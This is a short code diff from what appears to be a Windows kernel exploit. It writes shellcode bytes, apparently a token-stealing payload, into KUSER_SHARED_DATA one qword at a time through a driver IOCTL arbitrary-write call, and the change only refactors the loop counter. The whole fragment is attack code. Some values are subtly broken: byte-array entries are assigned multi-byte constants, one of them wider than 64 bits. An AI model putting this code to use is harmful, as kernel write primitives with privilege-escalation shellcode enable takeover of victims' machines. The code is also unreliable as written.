@@ -297,6 +297,7 @@ const unsigned char payload[] = {
     "\xC3"                                              // ret                 ; Done!
 };
 */
+    int j=0;
 
     payload[0] = 0x0000018825048b4865;
     payload[1] = 0x000000B8808B4800;
@@ -308,9 +309,11 @@ const unsigned char payload[] = {
     payload[7] = 0x4800000360888948;
     payload[8] = 0x0000000000C3C031;
 
-    for (int i=0,j=0; i < 9;i++,j+=8)
+    
+    for (int i=0; i < 9;i++)
     {
         SendToDriver(driverHandle,0x0022200B,(void*) &payload[i], (void*) (((unsigned long long) KUSER_SHARED_DATA)+j));
+        j+=8;
     }
     return (void*) KUSER_SHARED_DATA;
 }
